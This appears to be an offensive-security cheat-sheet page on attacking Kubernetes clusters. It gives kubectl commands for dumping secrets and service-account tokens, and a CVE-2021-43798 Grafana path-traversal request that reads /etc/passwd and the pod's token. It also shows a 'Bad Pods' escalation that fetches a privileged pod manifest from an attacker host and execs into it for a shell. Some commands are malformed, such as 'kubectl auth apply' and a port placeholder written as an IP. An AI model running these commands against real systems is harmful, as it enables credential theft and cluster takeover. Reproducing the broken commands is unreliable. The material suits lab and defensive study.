---
title: Kubernetes
desc: A container orchestration system for automating software deployment, scaling, and management.
tags: [Container, Docker, PrivEsc]
alts: [Docker]
website: 
render_with_liquid: false
---

## Interact with Kubernetes API Server

```sh
# On target machine

# Create a ServiceAccount
kubectl serviceaccount api-explorer
# Bind the ClusterRole to the ServiceAccount
# eg. namespace: default
kubectl create rolebinding api-explorer:log-reader --clusterrole log-reader --serviceaccount default:api-explorer 


# Check your permission
kubectl auth can-i --list
# /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list --token=<JWT>

# List all pods
kubectl get pods

# List all secrets
kubectl get secrets
# Get the specific secret
kubectl get secret <secret-name>
# Get the specific secret to output json
kubectl get secret <secret-name> -o 'json'
# List all data contained in the specific secret
kubectl describe secret <secret-name>


# Get the token (JWT) of the service account running a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

<br />

## Grafana Path Traversal

Kubernetes creates environment variables by default.

```sh
# On target machine

# Check environment variables
env

...
GRAFANA_SERVICE_HOST=10.108.133.228
...
GRAFANA_PORT=tcp://10.108.133.228:3000
...
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000

# If you found Grafana service running on the cluster,
# You can access the service at http://<grafana-ip>:<grafana-port>
curl http://<grafana-ip>:<grafana-ip>

# Then check Grafana version and vulnerabilities in the output.

# CVE-2021-43798
curl --path-as-is http://<grafana-ip>:<grafana-port>/public/plugins/alertlist/../../../../../../../../etc/passwd
# Get the token (JWT) of the service account
curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
# Decode the JWT and get information

# Check your permission of this service
kubectl auth can-i --list --token=<Grafana-JWT>
# List pods
kubectl get pods --token=<JWT>
# Get shell on the Grafana pod. 
kubectl exec -it <grafana-pod-name> --token=<Grafana-JWT> -- /bin/bash
```

<br />

## Pod Privilege Escalation (Bad Pods)

[everything-allowed-exec-pod.yaml](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml)

```sh
# On attack machine

# Get the bad pod
wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml -O privesc.yaml
# Open http server
python3 -m http.server

# --------------------------------------------------

# On target machine

# Download the bad pod on the attack machine
wget http://<attack-ip>:8000/privesc.yaml

# Create the pod
kubectl auth apply -f privesc.yaml --token=<JWT>
# List all pods
kubectl get pods --token=<JWT>
# Get shell
kubectl exec -it everything-allowed-exec-pod --token=<JWT> -- /bin/bash
```